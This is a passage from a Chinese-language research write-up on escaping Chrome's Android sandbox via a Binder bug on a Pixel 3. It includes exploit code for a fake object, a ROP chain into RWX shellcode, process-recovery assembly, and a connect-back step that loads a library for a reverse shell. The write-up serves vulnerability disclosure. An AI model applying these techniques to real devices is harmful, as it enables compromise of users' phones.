        while ( __strex(v6 - 0x10000000, (unsigned int *)result) );
        result = (*(int (__fastcall **)(_DWORD))(**(_DWORD **)(result + 8) + 8))(*(_DWORD *)(result + 8)); // [2]
      }
      return result;
    }
在[1]处取消引用的指针必须指向可写地址，并且其内容不得为特殊值0x10000000，以避免在[2]处进行调用。  
第一部分是存在问题的，因为我们的伪对象位于一个Binder映射中，该映射对于用户区域始终是可读的。在我们的利用中，我们将这个指针设置为libc数据段中的临时缓冲区。之所以这样做，是因为我们已经假设目标进程映射与我们自己的映射非常相似，因此可以通过这种方式简单地获取自己的libc地址。  
一旦经过incStrong调用，代码就会直接流向到以下的间接调用：
    int __fastcall android::javaObjectForIBinder(int a1, android **myobj)
    {
      if ( !*myobj )
        return 0;
      if ( (*(int (__fastcall **)(android *, int *))(*(_DWORD *)*myobj + 32))(*myobj, &dword_153848) )
        return *((_DWORD *)*myobj + 4);
这里*myobj的值与伪对象的值匹配，因此我们最终从伪对象中调用函数指针，并将伪对象地址作为第一个参数传递。因此，通过以下代码，我们可以获得代码执行：
    /*
     * We use the address of the __sF symbol as temporary storage. From the source code,
     * this symbol appears to be unused in the current bionic library.
     */
    uint32_t utmp = (uint32_t)dlsym(handle, "__sF");
    DO_LOG("[*] Temporary storage: %xn", utmp);
    ...
    DO_LOG("[*] fake_object_addr: %xn", fake_object_addr);
    uint64_t offset_ref_base = 0xd0;
    fake_object[0] = fake_object_addr + offset_ref_base*sizeof(uint32_t) + 12;
    ...
    /*
     * This is a fake RefBase class, with a pointer to a writable area in libc.
     * We need this because our object is located in the binder mapping and cannot
     * be written to from usermode.
     *
     * The RefBase code will try to increment a refcount before we get control, so
     * pointing it to an empty buffer is fine. The only thing we need to take care of
     * is preventing it from being the special `initial value` of strong ref counts,
     * because in this case the code will also do a virtual functionc all through this
     * fake object.
     */
    fake_object[offset_ref_base] = (offset_ref_base + 1)*sizeof(uint32_t); /* This is used as an offset from the base object*/
    fake_object[offset_ref_base+1] = 0xdeadbeef;                           /* Unused */
    fake_object[offset_ref_base+2] = (uint32_t)utmp;                       /* Writable address in libc */
    /* Here comes the PC control. We point it to a stack pivot, and r0
     * points to the beginning of our object (i.e to &fake_object[0]).
     */
    fake_object[offset_ref_base +11] = gadgets[STACK_PIVOT].address;
utmp此处是libc中似乎已经被使用的缓冲区地址，它是作为可写映射的一部分。由于libc在渲染器进程和浏览器进程上的地址相同，因此我们可以在自己的进程中对其进行解析。同样，我们也可以使用自己的进程来解析所有的ROP小工具。  
另外，由于Binder映射地址在两个进程中都相同，我们可以使用它来计算目标进程中我们自己数据的地址。  
由于还会将伪对象作为第一个参数传递，因此我们使用一个ldm r0!, {r2, r5, ip, sp, lr,
pc})小工具，将堆栈旋转到R0，并从对象的起始部分启动ROP链。最终的设置如下所示：  
但是，由于映射是只读的，因此无法调用使用堆栈的任何函数。所以，我们的ROP链将执行以下步骤：  
1、实用小工具，将r7保存到utmp缓冲区中。当我们的ROP链开始执行时，r7包含一个指向堆栈的指针，这将允许我们随后定义堆栈的值。为此，我们使用了以下的小工具：`str
r7, [r0] ; mov r0, r4 ; add sp, #0xc ; pop {r4, r5, r6, r7, pc}`。  
2、使用mmap，在固定地址上分配RWX页面。为此，我们使用来自libc系统调用包装程序的以下代码：`svc 0 ; pop {r4-r7} ; cmn
r0, #0x1000, bxlr lr`。  
3、使用一些ROP小工具，将第一阶段的Shellcode复制到RWX内存中。特别是，我们使用`str r1, [r0] ; mov r0, lr ; pop
{r7, pc}`从堆栈中弹出这些寄存器后，将r1写入r0指向的地址。  
4、将堆栈旋转到RWX内存，对复制的Shellcode调用cacheflush并跳转到它。我们使用`pop {lr,
pc}`小工具准备cacheflush的返回地址，并使用`pop {r0, r1, ip, sp, pc}`小工具旋转堆栈并调用cacheflush。  
一旦cacheflush返回，就可以执行Shellcode，并能正确读写堆栈。  
为了减小ROP链的大小，我们使用一个较小的初始Shellcode，该Shellcode使用memcpy将下一阶段复制到RWX内存中，然后再次调用cacheflush，并最终跳转到它。  
现在，我们可以不受限制地执行Shellcode，我们可以执行漏洞利用程序所需的任何操作，然后修复Chrome进程，以便用户可以继续使用浏览器。
## 进程持续
为了实现进程的持续，我们的主要Shellcode将连接回127.0.0.1:6666，并检索一个共享库。共享库存储为/data/data//test.so，并使用
**loader_dlopen加载。  
**
loader_dlopen符号当前通过注入渲染器的代码进行解析。这是必须的，因为默认的dlopen将阻止从非标准路径加载库，Shellcode将会恢复浏览器的进程状态。  
为此，我们使用一个较高的堆栈帧，该堆栈帧可以从堆栈中还原出大多数寄存器。特别是，我们使用由art_quick_invoke_stub存储在libart.so中的寄存器的副本：
    .text:0042F7AA                 POP.W           {R4-R11,PC}
    .text:0042F7AE ; ---------------------------------------------------------------------------    .text:0042F7AE
    .text:0042F7AE loc_42F7AE                              ; CODE XREF: art_quick_invoke_stub+106↑j
    .text:0042F7AE                 BLX             __stack_chk_fail
    .text:0042F7AE ; End of function art_quick_invoke_stub
    .text:0042F7AE
渲染器代码解析ArtMethod::Invoke程序集代码，并找到art_quick_invoke_stub调用的返回地址。然后，Shellcode在堆栈中查找以找到相应的堆栈帧，并在返回之前恢复所有寄存器。  
但是，仅仅是返回到该位置，将会导致Art VM随后发生崩溃。  
为了解决这一问题，我们分析了崩溃发生的位置。我们观察到的崩溃与垃圾回收有关，并且会在以下代码中发生：
    void Thread::HandleScopeVisitRoots(RootVisitor* visitor, pid_t thread_id) {
      BufferedRootVisitor buffered_visitor(
          visitor, RootInfo(kRootNativeStack, thread_id));
      for (BaseHandleScope* cur = tlsPtr_.top_handle_scope; cur; cur = cur->GetLink()) {
        cur->VisitRoots(buffered_visitor);
      }
    }
或者查看其编译代码：
    PUSH.W          {R4-R11,LR}
    SUB.W           SP, SP, #0x418
    SUB             SP, SP, #4
    MOV             R5, R1
    LDR             R1, =(__stack_chk_guard_ptr - 0x3AE4A6)
    ADD             R1, PC  ; __stack_chk_guard_ptr
    LDR.W           R10, [R1] ; __stack_chk_guard
    LDR.W           R1, [R10]
    LDR             R3, =(_ZTVN3art8RootInfoE - 0x3AE4B8) ; `vtable for'art::RootInfo
    STR.W           R1, [SP,#0x440+var_28]
    MOVS            R1, #4
    ADD             R3, PC  ; `vtable for'art::RootInfo
    STR             R1, [SP,#0x440+var_434]
    ADD.W           R1, R3, #8
    STR             R2, [SP,#0x440+var_430]
    MOVS            R2, #0
    STR.W           R2, [SP,#0x440+var_2C]
    STRD.W          R5, R1, [SP,#0x440+var_43C]
    LDR.W           R7, [R0,#0xDC]           ; [1]
    CMP             R7, #0
    BEQ             loc_3AE582
在[1]中，我们检查Thread对象的偏移量0xDC是否为null。在我们返回的位置，r6指向当前的Thread _对象。  
因此，我们的Shellcode从还原的寄存器中获取当前的Thread _值，并在继续操作之前清除该字段。  
Shellcode的最终恢复部分如下所示：
    return:
    # Get and fix sp up. Point to stack frame containing r4-r10 and pc.
      ldr r3, smem
      ldr sp, [r3]
      ldr r3, retoff
    search:
      # Load 'lr' if there 
      ldr r0, [sp, #0x20] 
      cmp r0, r3
      addne sp, sp, #4
      bne search
    done: 
    # Pop all registers
      pop {r4-r11, lr}
    # Clear thread top_handle_scope
      mov r0, #0
      str r0, [r6, #0xdc]
      bx lr
这样一来，在加载共享对象后，浏览器进程将会照常执行。共享对象就可以执行任何其他操作，例如启动后台线程，或者启动反向Shell。
## 演示视频
下面的视频中展示了在更新2020年2月补丁后，在易受攻击的Pixel 3设备上如何攻击Chrome浏览器的过程。在左上角，我们可以看到目标设备上的root
Shell，用于将漏洞利用代码注入到渲染器进程中。在左下角，可以通过logcat看到漏洞利用过程的输出结果。  
在右侧，展示的是目标设备的屏幕显示，其中展示了目标设备启动Chrome的过程。在启动Chrome后，我们使用root
Shell注入Shellcode，几乎立即可以在屏幕的左上角看到一个反向Shell。  
如我们所见，这个Shell是在浏览器进程的上下文运行的，因此实现了沙箱逃逸。  
视频地址：
## 后续研究
大家可以在Blue Frost Security GitHub中，找到本文所述的漏洞利用代码。我们提供的该代码，仅用于演示目的。  
在下一篇文章中，我们将讨论如何攻击内核执行的处理过程，以便使用相同的漏洞来实现到root的特权提升。